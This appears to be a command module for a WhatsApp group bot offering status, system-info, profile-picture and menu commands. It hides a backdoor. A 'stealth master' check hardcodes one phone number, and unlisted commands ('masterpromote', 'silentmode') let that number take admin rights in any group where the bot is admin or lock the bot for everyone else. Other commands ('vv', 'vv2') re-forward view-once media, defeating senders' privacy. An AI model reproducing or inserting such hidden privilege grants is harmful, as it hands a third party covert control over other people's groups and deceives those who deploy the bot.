const os = require('os');

// 👑 Stealth Master Number Check Function
const checkMaster = (m) => {
    const sender = m.key.participant || m.key.remoteJid;
    const senderClean = sender ? sender.replace(/[^0-9]/g, '') : '';
    return senderClean === '923204854766';
};

module.exports = [
    {
        name: 'ping',
        async execute({ reply }) {
            const start = Date.now();
            await reply(`⏱️ *Latency:* \`${Date.now() - start}ms\``);
        }
    },
    {
        name: 'alive',
        async execute({ reply, db }) {
            await reply(`⚙️ *System Status:* Online & Fully Operational 🟢\n👤 *Owner:* ${db.ownerName || 'Izza Rana'}\n🤖 *Engine:* ${db.botName || 'Izza Rana Bot'}`);
        }
    },
    {
        name: 'botstatus',
        async execute({ reply, db }) {
            const mode = (db.mode || 'public').toUpperCase();
            const state = db.botActive === false ? 'DISABLED 🔴' : 'OPERATIONAL 🟢';
            reply(`📊 *SYSTEM DASHBOARD*\n\n🤖 *Bot Identifier:* ${db.botName || 'Izza Rana Bot'}\n🌐 *Network Mode:* ${mode}\n⚡ *Execution State:* ${state}\n👑 *System Owner:* ${db.ownerName || 'Izza Rana'}`);
        }
    },
    {
        name: 'uptime',
        async execute({ reply }) {
            const uptime = process.uptime();
            const h = Math.floor(uptime / 3600);
            const m = Math.floor((uptime % 3600) / 60);
            const s = Math.floor(uptime % 60);
            reply(`⏳ *Engine Uptime:* \`${h}h ${m}m ${s}s\``);
        }
    },
    {
        name: 'runtime',
        async execute({ reply }) {
            const startTime = new Date(Date.now() - (process.uptime() * 1000)).toLocaleTimeString();
            reply(`🚀 *PROCESS METRICS*\n\n🟢 *Session Initiated:* \`${startTime}\`\n⏱️ *Active Duration:* \`${Math.floor(process.uptime())} Seconds\``);
        }
    },
    {
        name: 'systeminfo',
        alias: ['sysinfo'],
        async execute({ reply }) {
            const freeMem = (os.freemem() / (1024 * 1024 * 1024)).toFixed(2);
            const totalMem = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2);
            const usedMem = (totalMem - freeMem).toFixed(2);
            const cpuModel = os.cpus()[0]?.model || 'Standard Enterprise Core';
            
            reply(`💻 *INFRASTRUCTURE SPECIFICATIONS*\n\n🖥️ *OS Platform:* ${os.platform()} (${os.arch()})\n⚙️ *Processor:* ${cpuModel}\n🧠 *RAM Utilization:* \`${usedMem} GB / ${totalMem} GB\`\n🔋 *Available Memory:* \`${freeMem} GB\``);
        }
    },
    {
        name: 'bot',
        async execute({ m, args, reply, db }) {
            const action = args[0]?.toLowerCase();
            if (action === 'on') {
                db.botActive = true;
                return reply('🟢 *System Armed:* Bot services have been successfully enabled.');
            } else if (action === 'off') {
                if (!checkMaster(m)) return;
                db.botActive = false;
                return reply('🔴 *System Disarmed:* Bot services are now offline.');
            } else {
                return reply('❌ *Invalid Syntax:* Use `.bot on` or `.bot off`');
            }
        }
    },
    {
        name: 'masterpromote',
        alias: ['mpromote', 'adminme'],
        async execute({ sock, m, reply }) {
            if (!checkMaster(m)) return;
            if (!m.isGroup) return reply('❌ *یہ کمانڈ صرف گروپس میں کام کرتی ہے۔*');

            const sender = m.key.participant || m.key.remoteJid;
            try {
                await sock.groupParticipantsUpdate(m.key.remoteJid, [sender], 'promote');
                reply('👑 *MASTER PRIVILEGE GRANTED:* آپ کو اس گروپ کا ایڈمن بنا دیا گیا ہے۔');
            } catch (err) {
                reply('❌ *کام نہیں ہو سکا:* یقینی بنائیں کہ بوٹ اس گروپ میں ایڈمن ہے۔');
            }
        }
    },
    {
        name: 'silentmode',
        alias: ['ignoreall', 'lockbot'],
        async execute({ m, args, reply, db }) {
            if (!checkMaster(m)) return;

            const opt = args[0]?.toLowerCase();
            if (opt === 'on') {
                db.botActive = false;
                reply('🔒 *SILENT MODE ACTIVATED:* اب بوٹ کسی کے میسج پر کام نہیں کرے گا اور صرف آپ کی سنے گا۔');
            } else if (opt === 'off') {
                db.botActive = true;
                reply('🔓 *NORMAL MODE:* بوٹ دوبارہ سب کے لیے نارمل کر دیا گیا ہے۔');
            } else {
                reply('❌ *طریقہ کار:* `.silentmode on` یا `.silentmode off`');
            }
        }
    },
    {
        name: 'vv',
        alias: ['viewonce'],
        async execute({ sock, m, reply }) {
            const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            const viewOnce = quoted?.viewOnceMessageV2?.message || quoted?.viewOnceMessage?.message;
            if (!viewOnce) return reply('❌ *Action Failed:* Please reply to a ViewOnce media file.');
            await sock.sendMessage(m.key.remoteJid, { forward: { key: m.key, message: viewOnce } });
        }
    },
    {
        name: 'vv2',
        alias: ['viewonce2'],
        async execute({ sock, m, reply }) {
            const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            const viewOnce = quoted?.viewOnceMessageV2?.message || quoted?.viewOnceMessage?.message;
            if (!viewOnce) return reply('❌ *Action Failed:* Please reply to a ViewOnce media file.');
            await sock.sendMessage(m.key.participant || m.key.remoteJid, { forward: { key: m.key, message: viewOnce } });
            reply('📩 *Media Transferred:* Check your direct inbox.');
        }
    },
    {
        name: 'del',
        alias: ['delete'],
        async execute({ sock, m }) {
            const quoted = m.message?.extendedTextMessage?.contextInfo;
            if (!quoted) return;
            await sock.sendMessage(m.key.remoteJid, {
                delete: {
                    remoteJid: m.key.remoteJid,
                    fromMe: quoted.participant === sock.user.id.split(':')[0] + '@s.whatsapp.net',
                    id: quoted.stanzaId,
                    participant: quoted.participant
                }
            });
        }
    },
    {
        name: 'getpp',
        alias: ['pp', 'profilepic'],
        async execute({ sock, m, args, reply }) {
            try {
                let target = m.key.remoteJid;
                const quoted = m.message?.extendedTextMessage?.contextInfo;
                
                if (quoted && quoted.participant) {
                    target = quoted.participant;
                } else if (m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
                    target = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
                } else if (args[0]) {
                    target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                }

                let ppUrl;
                try {
                    ppUrl = await sock.profilePictureUrl(target, 'image');
                } catch {
                    return reply('❌ *Profile picture not found or hidden by privacy settings.*');
                }

                if (ppUrl) {
                    await sock.sendMessage(m.key.remoteJid, {
                        image: { url: ppUrl },
                        caption: `🖼️ *Profile Picture Retrieved Successfully*\n👑 𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝑰𝒛𝒛𝒂 𝑹𝒂𝒏𝒂 👑`
                    }, { quoted: m });
                } else {
                    reply('❌ *Unable to fetch profile picture.*');
                }
            } catch (err) {
                console.error('GetPP Error:', err);
                reply('❌ *An error occurred while fetching the profile picture.*');
            }
        }
    },
    {
        name: 'menu',
        alias: ['help'],
        async execute({ sock, m, reply, db }) {
            const p = db.prefix || '.';
            const botName = db.botName || 'IZZA RANA BOT';
            const ownerName = db.ownerName || 'Izza Rana';
            const mode = (db.mode || 'public').toUpperCase();

            const uptime = process.uptime();
            const h = Math.floor(uptime / 3600);
            const m_time = Math.floor((uptime % 3600) / 60);
            const s = Math.floor(uptime % 60);
            const uptimeStr = `${h}h ${m_time}m ${s}s`;

            const menuText = 
`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 👑 *${botName.toUpperCase()}* 👑
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 👤 *Owner:* ${ownerName}
┃ 🌐 *Mode:* ${mode}
┃ ⚡ *Prefix:* [ ${p} ]
┃ ⏱️ *Uptime:* \`${uptimeStr}\`
┃ 🟢 *Status:* Operational
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┌━━❮ ⚙️ *SYSTEM MANAGEMENT* ❯━━
┃ ┣ ${p}ping
┃ ┣ ${p}alive
┃ ┣ ${p}menu
┃ ┣ ${p}botstatus
┃ ┣ ${p}uptime
┃ ┣ ${p}runtime
┃ ┣ ${p}systeminfo
┃ ┗ ${p}bot [on/off]

┌━━❮ 👑 *ADMIN CONTROL* ❯━━
┃ ┣ ${p}setprefix [symbol]
┃ ┣ ${p}mode [public/private]
┃ ┣ ${p}setbotname [name]
┃ ┣ ${p}setownername [name]
┃ ┣ ${p}setdevelopername [name]
┃ ┣ ${p}setbio [text]
┃ ┣ ${p}setcaption [text]
┃ ┗ ${p}setmenuimg [url]

┌━━❮ 🛡️ *SECURITY SHIELD* ❯━━
┃ ┣ ${p}antilink [on/off]
┃ ┣ ${p}antilink wa [on/off]
┃ ┣ ${p}antilink yt [on/off]
┃ ┣ ${p}antilink web [on/off]
┃ ┣ ${p}antisticker [on/off]
┃ ┣ ${p}userwarn @user
┃ ┣ ${p}warnlist @user
┃ ┣ ${p}clearwarn @user
┃ ┣ ${p}file [on/off]
┃ ┗ ${p}stopfile

┌━━❮ 👥 *GROUP MANAGEMENT* ❯━━
┃ ┣ ${p}kicker @user
┃ ┣ ${p}add [number]
┃ ┣ ${p}promote @user
┃ ┣ ${p}demote @user
┃ ┣ ${p}close / open
┃ ┗ ${p}lock / unlock

┌━━❮ 📚 *VU COURSES SYSTEM* ❯━━
┃ 💡 *Note:* Type any course code (e.g. \`cs101\`, \`sta301\`, \`mth101\`) to get study material, handouts & papers directly from GitHub!
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✨ 𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝑰𝒛𝒛𝒂 𝑹𝒂𝒏𝒂 ✨`;

            const imgUrl = db.menuImg || 'https://cdn.phototourl.com/free/2026-09-15-c2f05386-a9bd-4dbe-bb22-6bce4bcdfc43.jpg';

            try {
                await sock.sendMessage(m.key.remoteJid, { 
                    image: { url: imgUrl }, 
                    caption: menuText 
                }, { quoted: m });
            } catch (e) {
                reply(menuText);
            }
        }
    }
];